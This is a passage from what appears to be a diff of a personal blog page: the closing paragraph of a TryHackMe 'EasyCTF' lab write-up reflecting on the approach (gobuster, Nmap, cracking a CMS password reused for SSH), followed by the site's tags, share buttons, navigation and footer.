+</code></pre></div><p>With that we are able to fully answer all questions for the room and we saw how to get the flags. I believe running <strong>gobuster</strong> right along with <strong>Nmap</strong> was the right way to go. In that case dealing with this script and cracking the password for the CMS would have given us the password for the SSH connection. Anyways, there could be other ways to go about this box. This was mine.</p>
+<p>As usual, happy hacking.</p>
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css">
+
+<div class="container" style="margin:10px !important">
+    <div class="center">
+        <script src="https://tryhackme.com/badge/71634"></script>
+    </div>
+    <div class="center">
+        <a href="https://twitter.com/Tzero86" target="_blank" class="fa fa-twitter" style="text-decoration: none !important;  font-size: 30px; padding: 5px"></a>
+        <a href="https://github.com/Tzero86" target="_blank" class="fa fa-github" style="text-decoration: none !important;  font-size: 30px; padding: 5px"></a> 
+        <br> 
+</div>
+
+      </div>
+    </article>
+
+    <hr />
+
+    <div class="post-info">
+        <p>
+          <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-tag meta-icon">
+            <path d="M20.59 13.41l-7.17 7.17a2 2 0 0 1-2.83 0L2 12V2h10l8.59 8.59a2 2 0 0 1 0 2.82z"></path>
+            <line x1="7" y1="7" x2="7" y2="7"></line>
+          </svg><span class="tag"><a href="https://tzero86-bits.netlify.app/tags/hacking/">hacking</a></span><span class="tag"><a href="https://tzero86-bits.netlify.app/tags/tryhackme/">tryHackme</a></span><span class="tag"><a href="https://tzero86-bits.netlify.app/tags/writeups/">writeups</a></span>
+        </p>
+
+      <p>
+        <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-file-text">
+          <path d="M14 2H6a2 2 0 0 0-2 2v16a2 2 0 0 0 2 2h12a2 2 0 0 0 2-2V8z"></path>
+          <polyline points="14 2 14 8 20 8"></polyline>
+          <line x1="16" y1="13" x2="8" y2="13"></line>
+          <line x1="16" y1="17" x2="8" y2="17"></line>
+          <polyline points="10 9 9 9 8 9"></polyline>
+        </svg>
+        1890 Words
+      </p>
+
+      <p>
+        <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-calendar">
+          <rect x="3" y="4" width="18" height="18" rx="2" ry="2"></rect>
+          <line x1="16" y1="2" x2="16" y2="6"></line>
+          <line x1="8" y1="2" x2="8" y2="6"></line>
+          <line x1="3" y1="10" x2="21" y2="10"></line>
+        </svg>
+        2020-08-21 14:37 -0400
+      </p>
+    </div>
+      <hr />
+      <div class="sharing-buttons">
+        
+<a class="resp-sharing-button__link" href="https://facebook.com/sharer/sharer.php?u=https%3a%2f%2ftzero86-bits.netlify.app%2fposts%2feasyctf_writeup%2f" target="_blank" rel="noopener" aria-label="" title="Share on facebook">
+  <div class="resp-sharing-button resp-sharing-button--facebook resp-sharing-button--small"><div aria-hidden="true" class="resp-sharing-button__icon resp-sharing-button__icon--solid">
+    <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M18 2h-3a5 5 0 0 0-5 5v3H7v4h3v8h4v-8h3l1-4h-4V7a1 1 0 0 1 1-1h3z"></path></svg>
+    </div>
+  </div>
+</a>
+
+
+<a class="resp-sharing-button__link" href="https://twitter.com/intent/tweet/?url=https%3a%2f%2ftzero86-bits.netlify.app%2fposts%2feasyctf_writeup%2f" target="_blank" rel="noopener" aria-label="" title="Share on twitter">
+  <div class="resp-sharing-button resp-sharing-button--twitter resp-sharing-button--small">
+      <div aria-hidden="true" class="resp-sharing-button__icon resp-sharing-button__icon--solid">
+        <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M23 3a10.9 10.9 0 0 1-3.14 1.53 4.48 4.48 0 0 0-7.86 3v1A10.66 10.66 0 0 1 3 4s-4 9 5 13a11.64 11.64 0 0 1-7 2c9 5 20 0 20-11.5a4.5 4.5 0 0 0-.08-.83A7.72 7.72 0 0 0 23 3z"></path></svg>
+    </div>
+  </div>
+</a>
+
+
+<a class="resp-sharing-button__link" href="https://www.tumblr.com/widgets/share/tool?posttype=link&amp;title=EasyCTF_writeup.sh&amp;caption=EasyCTF_writeup.sh&amp;canonicalUrl=https%3a%2f%2ftzero86-bits.netlify.app%2fposts%2feasyctf_writeup%2f" target="_blank" rel="noopener" aria-label="" title="Share on tumblr">
+  <div class="resp-sharing-button resp-sharing-button--tumblr resp-sharing-button--small">
+    <div aria-hidden="true" class="resp-sharing-button__icon resp-sharing-button__icon--solid">
+      <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="currentColor" stroke="none" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M14.563 24c-5.093 0-7.031-3.756-7.031-6.411V9.747H5.116V6.648c3.63-1.313 4.512-4.596 4.71-6.469C9.84.051 9.941 0 9.999 0h3.517v6.114h4.801v3.633h-4.82v7.47c.016 1.001.375 2.371 2.207 2.371h.09c.631-.02 1.486-.205 1.936-.419l1.156 3.425c-.436.636-2.4 1.374-4.156 1.404h-.178l.011.002z"/></svg>
+    </div>
+  </div>
+</a>
+
+
+<a class="resp-sharing-button__link" href="mailto:?subject=EasyCTF_writeup.sh&amp;body=https%3a%2f%2ftzero86-bits.netlify.app%2fposts%2feasyctf_writeup%2f" target="_self" rel="noopener" aria-label="" title="Share via email">
+  <div class="resp-sharing-button resp-sharing-button--email resp-sharing-button--small"><div aria-hidden="true" class="resp-sharing-button__icon resp-sharing-button__icon--solid">
+    <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M4 4h16c1.1 0 2 .9 2 2v12c0 1.1-.9 2-2 2H4c-1.1 0-2-.9-2-2V6c0-1.1.9-2 2-2z"></path><polyline points="22,6 12,13 2,6"></polyline></svg>
+    </div>
+  </div>
+</a>
+
+
+<a class="resp-sharing-button__link" href="https://pinterest.com/pin/create/button/?url=https%3a%2f%2ftzero86-bits.netlify.app%2fposts%2feasyctf_writeup%2f&amp;media=https%3a%2f%2ftzero86-bits.netlify.app%2fposts%2feasyctf_writeup%2f;description=EasyCTF_writeup.sh" target="_blank" rel="noopener" aria-label="" title="Share on pinterest">
+  <div class="resp-sharing-button resp-sharing-button--pinterest resp-sharing-button--small"><div aria-hidden="true" class="resp-sharing-button__icon resp-sharing-button__icon--solid">
+    <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="currentColor" stroke="none"><path d="M12.017 0C5.396 0 .029 5.367.029 11.987c0 5.079 3.158 9.417 7.618 11.162-.105-.949-.199-2.403.041-3.439.219-.937 1.406-5.957 1.406-5.957s-.359-.72-.359-1.781c0-1.663.967-2.911 2.168-2.911 1.024 0 1.518.769 1.518 1.688 0 1.029-.653 2.567-.992 3.992-.285 1.193.6 2.165 1.775 2.165 2.128 0 3.768-2.245 3.768-5.487 0-2.861-2.063-4.869-5.008-4.869-3.41 0-5.409 2.562-5.409 5.199 0 1.033.394 2.143.889 2.741.099.12.112.225.085.345-.09.375-.293 1.199-.334 1.363-.053.225-.172.271-.401.165-1.495-.69-2.433-2.878-2.433-4.646 0-3.776 2.748-7.252 7.92-7.252 4.158 0 7.392 2.967 7.392 6.923 0 4.135-2.607 7.462-6.233 7.462-1.214 0-2.354-.629-2.758-1.379l-.749 2.848c-.269 1.045-1.004 2.352-1.498 3.146 1.123.345 2.306.535 3.55.535 6.607 0 11.985-5.365 11.985-11.987C23.97 5.39 18.592.026 11.985.026L12.017 0z"/></svg>
+    </div>
+  </div>
+</a>
+
+
+<a class="resp-sharing-button__link" href="https://www.linkedin.com/shareArticle?mini=true&amp;url=https%3a%2f%2ftzero86-bits.netlify.app%2fposts%2feasyctf_writeup%2f&amp;title=EasyCTF_writeup.sh&amp;summary=EasyCTF_writeup.sh&amp;source=https%3a%2f%2ftzero86-bits.netlify.app%2fposts%2feasyctf_writeup%2f" target="_blank" rel="noopener" aria-label="" title="Share on linkedin">
+  <div class="resp-sharing-button resp-sharing-button--linkedin resp-sharing-button--small"><div aria-hidden="true" class="resp-sharing-button__icon resp-sharing-button__icon--solid">
+    <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M16 8a6 6 0 0 1 6 6v7h-4v-7a2 2 0 0 0-2-2 2 2 0 0 0-2 2v7h-4v-7a6 6 0 0 1 6-6z"></path><rect x="2" y="9" width="4" height="12"></rect><circle cx="4" cy="4" r="2"></circle></svg>
+    </div>
+  </div>
+</a>
+
+
+<a class="resp-sharing-button__link" href="https://reddit.com/submit/?url=https%3a%2f%2ftzero86-bits.netlify.app%2fposts%2feasyctf_writeup%2f&amp;resubmit=true&amp;title=EasyCTF_writeup.sh" target="_blank" rel="noopener" aria-label="" title="Share on reddit">
+  <div class="resp-sharing-button resp-sharing-button--reddit resp-sharing-button--small"><div aria-hidden="true" class="resp-sharing-button__icon resp-sharing-button__icon--solid">
+    <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="currentColor" stroke="none"><path d="M12 0A12 12 0 0 0 0 12a12 12 0 0 0 12 12 12 12 0 0 0 12-12A12 12 0 0 0 12 0zm5.01 4.744c.688 0 1.25.561 1.25 1.249a1.25 1.25 0 0 1-2.498.056l-2.597-.547-.8 3.747c1.824.07 3.48.632 4.674 1.488.308-.309.73-.491 1.207-.491.968 0 1.754.786 1.754 1.754 0 .716-.435 1.333-1.01 1.614a3.111 3.111 0 0 1 .042.52c0 2.694-3.13 4.87-7.004 4.87-3.874 0-7.004-2.176-7.004-4.87 0-.183.015-.366.043-.534A1.748 1.748 0 0 1 4.028 12c0-.968.786-1.754 1.754-1.754.463 0 .898.196 1.207.49 1.207-.883 2.878-1.43 4.744-1.487l.885-4.182a.342.342 0 0 1 .14-.197.35.35 0 0 1 .238-.042l2.906.617a1.214 1.214 0 0 1 1.108-.701zM9.25 12C8.561 12 8 12.562 8 13.25c0 .687.561 1.248 1.25 1.248.687 0 1.248-.561 1.248-1.249 0-.688-.561-1.249-1.249-1.249zm5.5 0c-.687 0-1.248.561-1.248 1.25 0 .687.561 1.248 1.249 1.248.688 0 1.249-.561 1.249-1.249 0-.687-.562-1.249-1.25-1.249zm-5.466 3.99a.327.327 0 0 0-.231.094.33.33 0 0 0 0 .463c.842.842 2.484.913 2.961.913.477 0 2.105-.056 2.961-.913a.361.361 0 0 0 .029-.463.33.33 0 0 0-.464 0c-.547.533-1.684.73-2.512.73-.828 0-1.979-.196-2.512-.73a.326.326 0 0 0-.232-.095z"/></svg>
+    </div>
+  </div>
+</a>
+
+
+<a class="resp-sharing-button__link" href="https://www.xing.com/app/user?op=share;url=https%3a%2f%2ftzero86-bits.netlify.app%2fposts%2feasyctf_writeup%2f;title=EasyCTF_writeup.sh" target="_blank" rel="noopener" aria-label="" title="Share on xing">
+  <div class="resp-sharing-button resp-sharing-button--xing resp-sharing-button--small"><div aria-hidden="true" class="resp-sharing-button__icon resp-sharing-button__icon--solid">
+    <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="currentColor" stroke="none"><path d="M18.188 0c-.517 0-.741.325-.927.66 0 0-7.455 13.224-7.702 13.657.015.024 4.919 9.023 4.919 9.023.17.308.436.66.967.66h3.454c.211 0 .375-.078.463-.22.089-.151.089-.346-.009-.536l-4.879-8.916c-.004-.006-.004-.016 0-.022L22.139.756c.095-.191.097-.387.006-.535C22.056.078 21.894 0 21.686 0h-3.498zM3.648 4.74c-.211 0-.385.074-.473.216-.09.149-.078.339.02.531l2.34 4.05c.004.01.004.016 0 .021L1.86 16.051c-.099.188-.093.381 0 .529.085.142.239.234.45.234h3.461c.518 0 .766-.348.945-.667l3.734-6.609-2.378-4.155c-.172-.315-.434-.659-.962-.659H3.648v.016z"/></svg>
+    </div>
+  </div>
+</a>
+
+
+<a class="resp-sharing-button__link" href="whatsapp://send?text=EasyCTF_writeup.sh%20https%3a%2f%2ftzero86-bits.netlify.app%2fposts%2feasyctf_writeup%2f" target="_blank" rel="noopener" aria-label="" title="Share on whatsapp">
+  <div class="resp-sharing-button resp-sharing-button--whatsapp resp-sharing-button--small"><div aria-hidden="true" class="resp-sharing-button__icon resp-sharing-button__icon--solid">
+    <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="currentColor" stroke="none" stroke-width="1" stroke-linecap="round" stroke-linejoin="round"><path d="M17.472 14.382c-.297-.149-1.758-.867-2.03-.967-.273-.099-.471-.148-.67.15-.197.297-.767.966-.94 1.164-.173.199-.347.223-.644.075-.297-.15-1.255-.463-2.39-1.475-.883-.788-1.48-1.761-1.653-2.059-.173-.297-.018-.458.13-.606.134-.133.298-.347.446-.52.149-.174.198-.298.298-.497.099-.198.05-.371-.025-.52-.075-.149-.669-1.612-.916-2.207-.242-.579-.487-.5-.669-.51-.173-.008-.371-.01-.57-.01-.198 0-.52.074-.792.372-.272.297-1.04 1.016-1.04 2.479 0 1.462 1.065 2.875 1.213 3.074.149.198 2.096 3.2 5.077 4.487.709.306 1.262.489 1.694.625.712.227 1.36.195 1.871.118.571-.085 1.758-.719 2.006-1.413.248-.694.248-1.289.173-1.413-.074-.124-.272-.198-.57-.347m-5.421 7.403h-.004a9.87 9.87 0 01-5.031-1.378l-.361-.214-3.741.982.998-3.648-.235-.374a9.86 9.86 0 01-1.51-5.26c.001-5.45 4.436-9.884 9.888-9.884 2.64 0 5.122 1.03 6.988 2.898a9.825 9.825 0 012.893 6.994c-.003 5.45-4.437 9.884-9.885 9.884m8.413-18.297A11.815 11.815 0 0012.05 0C5.495 0 .16 5.335.157 11.892c0 2.096.547 4.142 1.588 5.945L.057 24l6.305-1.654a11.882 11.882 0 005.683 1.448h.005c6.554 0 11.89-5.335 11.893-11.893a11.821 11.821 0 00-3.48-8.413Z"/></svg>
+    </div>
+  </div>
+</a>
+
+
+<a class="resp-sharing-button__link" href="https://news.ycombinator.com/submitlink?u=https%3a%2f%2ftzero86-bits.netlify.app%2fposts%2feasyctf_writeup%2f&amp;t=EasyCTF_writeup.sh" target="_blank" rel="noopener" aria-label="" title="Share on hacker news">
+  <div class="resp-sharing-button resp-sharing-button--hackernews resp-sharing-button--small"><div aria-hidden="true" class="resp-sharing-button__icon resp-sharing-button__icon--solid">
+			<svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="currentColor" stroke="none"><path d="M0 24V0h24v24H0zM6.951 5.896l4.112 7.708v5.064h1.583v-4.972l4.148-7.799h-1.749l-2.457 4.875c-.372.745-.688 1.434-.688 1.434s-.297-.708-.651-1.434L8.831 5.896h-1.88z"/></svg>
+    </div>
+  </div>
+</a>
+
+
+<a class="resp-sharing-button__link" href="https://telegram.me/share/url?text=EasyCTF_writeup.sh&amp;url=https%3a%2f%2ftzero86-bits.netlify.app%2fposts%2feasyctf_writeup%2f" target="_blank" rel="noopener" aria-label="" title="Share on telegram">
+  <div class="resp-sharing-button resp-sharing-button--telegram resp-sharing-button--small"><div aria-hidden="true" class="resp-sharing-button__icon resp-sharing-button__icon--solid">
+      <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><line x1="22" y1="2" x2="11" y2="13"></line><polygon points="22 2 15 22 11 13 2 9 22 2"></polygon></svg>
+    </div>
+  </div>
+</a>
+
+      </div>
+
+    
+      <div class="pagination">
+        <div class="pagination__title">
+          <span class="pagination__title-h">Read other posts</span>
+          <hr />
+        </div>
+
+        <div class="pagination__buttons">
+          
+            <span class="button previous">
+              <a href="https://tzero86-bits.netlify.app/posts/gamezone_writeup/">
+                <span class="button__icon">←</span>
+                <span class="button__text">GameZone_writeup.sh</span>
+              </a>
+            </span>
+          
+
+          
+            <span class="button next">
+              <a href="https://tzero86-bits.netlify.app/posts/alfred_writeup/">
+                <span class="button__text">Alfred_writeup.sh</span>
+                <span class="button__icon">→</span>
+              </a>
+            </span>
+          
+        </div>
+      </div>
+    
+
+
+    
+
+  </main>
+
+            </div>
+
+            
+                <footer class="footer">
+    <div class="footer__inner">
+        <div class="footer__content">
+            <span>&copy; 2020</span>
+            
+            
+                <span><a href="https://creativecommons.org/licenses/by-nc/4.0/" target="_blank" rel="noopener">CC BY-NC 4.0</a></span>
+            
+            <span> <a href="https://tzero86-bits.netlify.app/posts/index.xml" target="_blank" title="rss"><svg xmlns="http://www.w3.org/2000/svg" width="18" height="18" viewBox="0 0 20 20" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-rss"><path d="M4 11a9 9 0 0 1 9 9"></path><path d="M4 4a16 16 0 0 1 16 16"></path><circle cx="5" cy="19" r="1"></circle></svg></a></span>
+        </div>
+    </div>
+    <div class="footer__inner">
+        <div class="footer__content">
+            <span>Powered by <a href="http://gohugo.io">Hugo</a></span>
+            <span>Made with &#10084; by <a href="https://github.com/rhazdon">Djordje Atlialp</a></span>
+        </div>
+    </div>
+</footer>
+
+            
+        </div>
+
+        
+
+
+
+
+<script type="text/javascript" src="/bundle.min.dc716e9092c9820b77f96da294d0120aeeb189b5bcea9752309ebea27fd53bbe6b13cffb2aca8ecf32525647ceb7001f76091de4199ac5a3caa432c070247f5b.js" integrity="sha512-3HFukJLJggt3&#43;W2ilNASCu6xibW86pdSMJ6&#43;on/VO75rE8/7KsqOzzJSVkfOtwAfdgkd5BmaxaPKpDLAcCR/Ww=="></script>
+    
+<script type="application/javascript">
+var doNotTrack = false;
+if (!doNotTrack) {
+	(function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
+	(i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
+	m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
+	})(window,document,'script','https://www.google-analytics.com/analytics.js','ga');
+	ga('create', 'UA-175520987-1', 'auto');
+	
+	ga('send', 'pageview');
+}
+</script>
+
+
+
+
+    </body>
+</html>
